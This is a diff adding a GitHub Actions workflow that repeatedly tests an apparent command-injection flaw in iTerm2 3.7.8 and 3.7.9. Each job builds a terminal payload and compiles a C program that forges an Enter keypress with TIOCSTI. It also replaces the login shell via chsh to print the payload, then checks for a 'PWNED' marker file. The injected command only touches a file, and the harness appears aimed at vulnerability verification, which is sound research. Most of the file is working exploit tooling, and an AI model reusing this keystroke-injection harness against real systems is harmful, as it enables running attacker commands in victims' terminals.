@@ -1,0 +1,527 @@
+name: macos-verify3
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/macos-verify3.yml'
+      - 'tools/**'
+  workflow_dispatch:
+
+jobs:
+  inj-378:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    env:
+      ITERM_VER: "3_7_8"
+      MODE: "newline"
+      MARKER: "PWNED_INJ_378"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          sudo -n true && echo "passwordless sudo: YES" || echo "passwordless sudo: NO"
+
+      - name: Download and install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "PWNED_INJ_378" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -8
+
+      - name: Build TIOCSTI injector
+        run: |
+          set -eux
+          cat > /tmp/inject.c <<'CEOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <unistd.h>
+          #include <string.h>
+          #include <errno.h>
+          #include <sys/ioctl.h>
+
+          int main(int argc, char **argv) {
+              int count = argc > 1 ? atoi(argv[1]) : 1;
+              int delay = argc > 2 ? atoi(argv[2]) : 120000;
+              char nl = '\n';
+              for (int i = 0; i < count; i++) {
+                  if (ioctl(STDIN_FILENO, TIOCSTI, &nl) < 0) {
+                      fprintf(stderr, "TIOCSTI_FAIL errno=%d (%s)\n", errno, strerror(errno));
+                      return 1;
+                  }
+                  usleep(delay);
+              }
+              fprintf(stderr, "TIOCSTI_OK injected %d newline(s)\n", count);
+              return 0;
+          }
+
+          CEOF
+          clang -O2 -o /tmp/inject /tmp/inject.c
+          chmod +x /tmp/inject
+          ls -la /tmp/inject
+          echo "--- self test (will fail without tty, that is expected) ---"
+          /tmp/inject 1 0 < /dev/null 2>&1 || true
+
+      - name: Install fake login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.sh <<'LSHEOF'
+          #!/bin/bash
+          LOG=/tmp/lsh.log
+          log() { echo "$*" >>"$LOG"; }
+
+          log "=== login shell started $(date) ==="
+          log "TTY: $(tty)"
+          log "TERM: $TERM"
+          log "UID: $(id -u) EUID: $(id -E 2>/dev/null || echo n/a)"
+
+          sleep 3
+          log "--- catting payload (stdout MUST go to the PTY) ---"
+          cat /tmp/payload.md
+          log "--- cat done ---"
+
+          # 让 iTerm2 有时间把响应写进 PTY 输入队列
+          sleep 3
+
+          # 关键：注入一个换行，等价于「用户按了回车」
+          # sudo 保留控制终端，所以 TIOCSTI 的 session 校验能过
+          log "--- injecting newline via TIOCSTI ---"
+          if sudo -n /tmp/inject 2>>"$LOG"; then
+            log "inject succeeded"
+          else
+            log "inject FAILED (see errno above)"
+            # 退路：不经 sudo 直接试，看是不是权限问题
+            /tmp/inject 2>>"$LOG" && log "inject worked without sudo" || log "inject needs root"
+          fi
+
+          sleep 4
+          log "--- marker check ---"
+          if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
+            log "MARKER_PRESENT"
+          else
+            log "MARKER_ABSENT"
+          fi
+
+          log "--- exec bash ---"
+          exec /bin/bash -l
+
+          LSHEOF
+          chmod +x /tmp/lsh.sh
+          cat /tmp/lsh.sh
+          if ! grep -qx /tmp/lsh.sh /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.sh | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.sh "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/x
+
+      - name: Launch iTerm2
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 30
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 24); do
+            sleep 5
+            if [ -f "$HOME/$MARKER" ]; then
+              echo "marker appeared after $((i*5))s"
+              break
+            fi
+          done
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT inj-378 ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev3-inj-378
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/shot.png
+          if-no-files-found: warn
+  inj-379-nl:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "newline"
+      MARKER: "PWNED_INJ_379NL"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          sudo -n true && echo "passwordless sudo: YES" || echo "passwordless sudo: NO"
+
+      - name: Download and install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "PWNED_INJ_379NL" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -8
+
+      - name: Build TIOCSTI injector
+        run: |
+          set -eux
+          cat > /tmp/inject.c <<'CEOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <unistd.h>
+          #include <string.h>
+          #include <errno.h>
+          #include <sys/ioctl.h>
+
+          int main(int argc, char **argv) {
+              int count = argc > 1 ? atoi(argv[1]) : 1;
+              int delay = argc > 2 ? atoi(argv[2]) : 120000;
+              char nl = '\n';
+              for (int i = 0; i < count; i++) {
+                  if (ioctl(STDIN_FILENO, TIOCSTI, &nl) < 0) {
+                      fprintf(stderr, "TIOCSTI_FAIL errno=%d (%s)\n", errno, strerror(errno));
+                      return 1;
+                  }
+                  usleep(delay);
+              }
+              fprintf(stderr, "TIOCSTI_OK injected %d newline(s)\n", count);
+              return 0;
+          }
+
+          CEOF
+          clang -O2 -o /tmp/inject /tmp/inject.c
+          chmod +x /tmp/inject
+          ls -la /tmp/inject
+          echo "--- self test (will fail without tty, that is expected) ---"
+          /tmp/inject 1 0 < /dev/null 2>&1 || true
+
+      - name: Install fake login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.sh <<'LSHEOF'
+          #!/bin/bash
+          LOG=/tmp/lsh.log
+          log() { echo "$*" >>"$LOG"; }
+
+          log "=== login shell started $(date) ==="
+          log "TTY: $(tty)"
+          log "TERM: $TERM"
+          log "UID: $(id -u) EUID: $(id -E 2>/dev/null || echo n/a)"
+
+          sleep 3
+          log "--- catting payload (stdout MUST go to the PTY) ---"
+          cat /tmp/payload.md
+          log "--- cat done ---"
+
+          # 让 iTerm2 有时间把响应写进 PTY 输入队列
+          sleep 3
+
+          # 关键：注入一个换行，等价于「用户按了回车」
+          # sudo 保留控制终端，所以 TIOCSTI 的 session 校验能过
+          log "--- injecting newline via TIOCSTI ---"
+          if sudo -n /tmp/inject 2>>"$LOG"; then
+            log "inject succeeded"
+          else
+            log "inject FAILED (see errno above)"
+            # 退路：不经 sudo 直接试，看是不是权限问题
+            /tmp/inject 2>>"$LOG" && log "inject worked without sudo" || log "inject needs root"
+          fi
+
+          sleep 4
+          log "--- marker check ---"
+          if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
+            log "MARKER_PRESENT"
+          else
+            log "MARKER_ABSENT"
+          fi
+
+          log "--- exec bash ---"
+          exec /bin/bash -l
+
+          LSHEOF
+          chmod +x /tmp/lsh.sh
+          cat /tmp/lsh.sh
+          if ! grep -qx /tmp/lsh.sh /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.sh | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.sh "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/x
+
+      - name: Launch iTerm2
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 30
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 24); do
+            sleep 5
+            if [ -f "$HOME/$MARKER" ]; then
+              echo "marker appeared after $((i*5))s"
+              break
+            fi
+          done
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT inj-379-nl ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev3-inj-379-nl
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/shot.png
+          if-no-files-found: warn
+  inj-379-semi:
+    runs-on: macos-latest
+    timeout-minutes: 25
+    env:
+      ITERM_VER: "3_7_9"
+      MODE: "semicolon"
+      MARKER: "PWNED_INJ_379S"
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Environment
+        run: |
+          sw_vers
+          uname -m
+          echo "user=$USER home=$HOME"
+          sudo -n true && echo "passwordless sudo: YES" || echo "passwordless sudo: NO"
+
+      - name: Download and install iTerm2
+        run: |
+          set -eux
+          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
+          mkdir -p /tmp/i
+          unzip -q /tmp/i.zip -d /tmp/i
+          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
+          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist
+          sudo rm -rf /Applications/iTerm.app
+          sudo cp -R /tmp/i/iTerm.app /Applications/
+          defaults write com.googlecode.iterm2 SUHasLaunchedBefore -bool true
+          defaults write com.googlecode.iterm2 NoSyncSuppressRestoreMessage -bool true
+          defaults write com.googlecode.iterm2 NoSyncDoNotAskAboutEmptySessions -bool true
+          defaults write com.googlecode.iterm2 PromptOnQuit -bool false
+
+      - name: Build payload
+        run: |
+          set -eux
+          echo "PWNED_INJ_379S" > /tmp/marker_name
+          python3 tools/make_payload.py --mode "$MODE" --cmd "touch $MARKER" --out /tmp/payload.md
+          od -c /tmp/payload.md | head -8
+
+      - name: Build TIOCSTI injector
+        run: |
+          set -eux
+          cat > /tmp/inject.c <<'CEOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          #include <unistd.h>
+          #include <string.h>
+          #include <errno.h>
+          #include <sys/ioctl.h>
+
+          int main(int argc, char **argv) {
+              int count = argc > 1 ? atoi(argv[1]) : 1;
+              int delay = argc > 2 ? atoi(argv[2]) : 120000;
+              char nl = '\n';
+              for (int i = 0; i < count; i++) {
+                  if (ioctl(STDIN_FILENO, TIOCSTI, &nl) < 0) {
+                      fprintf(stderr, "TIOCSTI_FAIL errno=%d (%s)\n", errno, strerror(errno));
+                      return 1;
+                  }
+                  usleep(delay);
+              }
+              fprintf(stderr, "TIOCSTI_OK injected %d newline(s)\n", count);
+              return 0;
+          }
+
+          CEOF
+          clang -O2 -o /tmp/inject /tmp/inject.c
+          chmod +x /tmp/inject
+          ls -la /tmp/inject
+          echo "--- self test (will fail without tty, that is expected) ---"
+          /tmp/inject 1 0 < /dev/null 2>&1 || true
+
+      - name: Install fake login shell
+        run: |
+          set -eux
+          cat > /tmp/lsh.sh <<'LSHEOF'
+          #!/bin/bash
+          LOG=/tmp/lsh.log
+          log() { echo "$*" >>"$LOG"; }
+
+          log "=== login shell started $(date) ==="
+          log "TTY: $(tty)"
+          log "TERM: $TERM"
+          log "UID: $(id -u) EUID: $(id -E 2>/dev/null || echo n/a)"
+
+          sleep 3
+          log "--- catting payload (stdout MUST go to the PTY) ---"
+          cat /tmp/payload.md
+          log "--- cat done ---"
+
+          # 让 iTerm2 有时间把响应写进 PTY 输入队列
+          sleep 3
+
+          # 关键：注入一个换行，等价于「用户按了回车」
+          # sudo 保留控制终端，所以 TIOCSTI 的 session 校验能过
+          log "--- injecting newline via TIOCSTI ---"
+          if sudo -n /tmp/inject 2>>"$LOG"; then
+            log "inject succeeded"
+          else
+            log "inject FAILED (see errno above)"
+            # 退路：不经 sudo 直接试，看是不是权限问题
+            /tmp/inject 2>>"$LOG" && log "inject worked without sudo" || log "inject needs root"
+          fi
+
+          sleep 4
+          log "--- marker check ---"
+          if [ -f "$HOME/$(cat /tmp/marker_name 2>/dev/null)" ]; then
+            log "MARKER_PRESENT"
+          else
+            log "MARKER_ABSENT"
+          fi
+
+          log "--- exec bash ---"
+          exec /bin/bash -l
+
+          LSHEOF
+          chmod +x /tmp/lsh.sh
+          cat /tmp/lsh.sh
+          if ! grep -qx /tmp/lsh.sh /etc/shells 2>/dev/null; then
+            echo /tmp/lsh.sh | sudo tee -a /etc/shells
+          fi
+          sudo chsh -s /tmp/lsh.sh "$USER"
+          dscl . -read /Users/$USER UserShell
+
+      - name: Clean
+        run: rm -f "$HOME/$MARKER" /tmp/lsh.log /tmp/x
+
+      - name: Launch iTerm2
+        run: |
+          open -a /Applications/iTerm.app
+          sleep 30
+          pgrep -l iTerm || echo ITERM_NOT_RUNNING
+
+      - name: Wait
+        run: |
+          for i in $(seq 1 24); do
+            sleep 5
+            if [ -f "$HOME/$MARKER" ]; then
+              echo "marker appeared after $((i*5))s"
+              break
+            fi
+          done
+
+      - name: Report
+        if: always()
+        run: |
+          echo "=============== REPORT inj-379-semi ==============="
+          echo "--- lsh.log ---"
+          cat /tmp/lsh.log 2>/dev/null || echo "(no log)"
+          echo ""
+          echo "--- marker ---"
+          if [ -f "$HOME/$MARKER" ]; then
+            echo "[RESULT] VULNERABLE"
+            ls -la "$HOME/$MARKER"
+          else
+            echo "[RESULT] NOT_EXPLOITED"
+          fi
+
+      - name: Screenshot
+        if: always()
+        run: screencapture -x /tmp/shot.png 2>/dev/null || true
+
+      - name: Upload
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ev3-inj-379-semi
+          path: |
+            /tmp/payload.md
+            /tmp/lsh.log
+            /tmp/shot.png
+          if-no-files-found: warn
